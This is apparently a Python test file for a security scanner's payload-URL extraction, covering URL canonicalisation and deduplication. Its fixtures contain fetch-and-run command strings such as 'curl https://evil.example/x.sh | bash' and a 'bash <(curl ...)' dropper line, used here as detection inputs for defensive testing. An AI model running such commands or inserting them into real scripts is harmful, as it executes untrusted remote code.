"""Bounded URL extraction for the G012/G013 payload joins."""

from trustsight.analysis.payload_signals import (
    MAX_PAYLOAD_URLS,
    canonical_payload_url,
    payload_urls,
)


def _finding(rule_id, reason="", evidence=None, **extra):
    return {"rule_id": rule_id, "reason": reason,
            "evidence": evidence or {}, **extra}


def test_canonical_url_keeps_scheme_host_port_and_path():
    assert canonical_payload_url(
        "HTTPS://Evil.Example:8443/dropper.sh?token=1#frag"
    ) == "https://evil.example:8443/dropper.sh"


def test_canonical_url_drops_default_port_and_query():
    assert canonical_payload_url(
        "http://evil.example:80/x.sh?a=1#b"
    ) == "http://evil.example/x.sh"


def test_canonical_url_rejects_incomplete_and_non_http_values():
    assert canonical_payload_url("") == ""
    assert canonical_payload_url("ftp://evil.example/x") == ""
    assert canonical_payload_url("https:///x") == ""
    assert canonical_payload_url("https://evil.example/" + "a" * 3000) == ""


def test_payload_urls_reads_only_allowlisted_rules():
    entry = _finding("R001", "Remote Script Execution: curl https://evil.example/x.sh | bash")
    assert payload_urls([entry]) == ["https://evil.example/x.sh"]
    # R010 is a broad practice rule, not a payload signal.
    assert payload_urls([_finding("R010", "uses https://evil.example/x.sh")]) == []


def test_payload_urls_dedupes_and_caps_a_package():
    urls = [f"https://evil.example/{index}.sh" for index in range(12)]
    reason = " ".join(f"curl {url} | bash" for url in urls)
    found = payload_urls([_finding("R001", reason)])
    assert len(found) == MAX_PAYLOAD_URLS
    assert len(set(found)) == len(found)


def test_payload_urls_ignores_truncated_url():
    assert payload_urls([_finding("R001", "curl https://")]) == []
    assert payload_urls([_finding("R001", "curl https://evil.example:bad")]) == []


def test_payload_urls_reads_nested_evidence():
    entry = _finding(
        "H090", "committed companion downloads and runs code",
        evidence={"body": "bash <(curl -L https://evil.example/dropper)"},
    )
    assert payload_urls([entry]) == ["https://evil.example/dropper"]


def test_canonical_url_handles_ipv6_and_userinfo():
    assert canonical_payload_url(
        "https://user:pass@[2001:db8::1]:8443/x?q=1"
    ) == "https://[2001:db8::1]:8443/x"


def test_payload_urls_tolerates_unexpected_entry_shapes():
    assert payload_urls([None, "x", {"rule_id": "R001"}]) == []


def test_payload_urls_bounds_time_spent_on_a_large_evidence_mapping():
    evidence = {str(index): "https://evil.example/x" for index in range(1000)}
    found = payload_urls([_finding("R001", "curl", evidence=evidence)])
    assert found == ["https://evil.example/x"]
